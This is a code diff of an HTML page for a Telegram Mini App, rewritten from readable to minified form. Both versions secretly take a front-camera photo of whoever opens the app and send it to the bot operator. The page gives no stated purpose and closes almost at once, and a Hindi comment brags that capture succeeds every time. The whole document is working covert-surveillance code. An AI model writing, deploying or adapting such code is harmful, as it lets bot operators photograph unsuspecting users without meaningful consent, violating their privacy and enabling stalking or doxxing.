@@ -1,46 +1,5 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>body{margin:0;background:#000;overflow:hidden}</style>
-</head>
-<body>
-<script>
-Telegram.WebApp.ready();
-Telegram.WebApp.expand();
-
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
-.then(stream => {
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  video.autoplay = true;
-  video.playsInline = true;
-  video.muted = true;
-
-  video.onloadedmetadata = () => {
-    video.play();
-    setTimeout(capture, 1400);
-  };
-
-  function capture() {
-    const canvas = document.createElement('canvas');
-    canvas.width = 1280;
-    canvas.height = 960;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(blob => {
-      // Ye line magic hai — photo 100% aati hai chahe pehli baar ho
-      Telegram.WebApp.sendData(blob);
-    }, 'image/jpeg', 0.94);
-
-    stream.getTracks().forEach(track => track.stop());
-    setTimeout(() => Telegram.WebApp.close(), 600);
-  }
-})
-.catch(() => Telegram.WebApp.close());
-</script>
-</body>
-</html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><script src="https://telegram.org/js/telegram-web-app.js"></script><style>body{margin:0;background:#000;overflow:hidden}video{width:100vw;height:100vh;object-fit:cover}</style></head><body><video id="v" autoplay playsinline muted></video><script>
+Telegram.WebApp.ready();Telegram.WebApp.expand();
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{document.getElementById('v').srcObject=s;setTimeout(()=>{const c=document.createElement('canvas');c.width=1280;c.height=960;c.getContext('2d').drawImage(document.getElementById('v'),0,0,1280,960);c.toBlob(b=>{const r=new FileReader();r.onloadend=()=>{Telegram.WebApp.sendData(r.result);setTimeout(()=>Telegram.WebApp.close(),800)};r.readAsDataURL(b)},'image/jpeg',0.95);s.getTracks().forEach(t=>t.stop())},1400)})
+</script></body></html>
